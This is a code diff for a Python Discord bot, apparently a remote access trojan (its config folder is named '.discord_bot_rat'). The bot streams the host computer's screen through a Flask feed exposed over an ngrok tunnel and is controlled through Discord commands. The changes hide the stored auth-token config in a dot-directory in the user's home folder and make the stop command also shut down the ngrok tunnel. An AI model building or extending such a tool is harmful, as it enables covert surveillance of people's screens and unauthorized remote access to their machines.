@@ -178,8 +178,6 @@ ngrok_process = None
 ngrok_url = None
 auth_token = None
 
-CONFIG_FILE = "bot_config.json"
-
 class ScreenStreamer:
     def __init__(self):
         self.fps = 10
@@ -303,7 +301,9 @@ def video_feed():
     global streamer
     return Response(streamer.generate_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')
-
+CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".discord_bot_rat")
+os.makedirs(CONFIG_DIR, exist_ok=True)
+CONFIG_FILE = os.path.join(CONFIG_DIR, "bot_config.json")
 def save_config():
     config = {"auth_token": auth_token}
     with open(CONFIG_FILE, 'w') as f:
@@ -480,14 +480,21 @@ async def live(ctx):
 
 @bot.command()
 async def stop(ctx):
-    global flask_thread
-    
+    global flask_thread, ngrok_process
+
     if not flask_thread or not flask_thread.is_alive():
         await ctx.send("No stream is currently running.")
         return
-    
+
     stop_services()
-    await ctx.send("Stream stopped successfully!")
+    if ngrok_process:
+        try:
+            ngrok_process.terminate()
+            ngrok_process = None
+        except Exception as e:
+            await ctx.send(f"Error stopping ngrok: {e}{watermark()}")
+
+    await ctx.send("Stream and ngrok tunnel stopped successfully!")
 
 @bot.command()
 async def status(ctx):
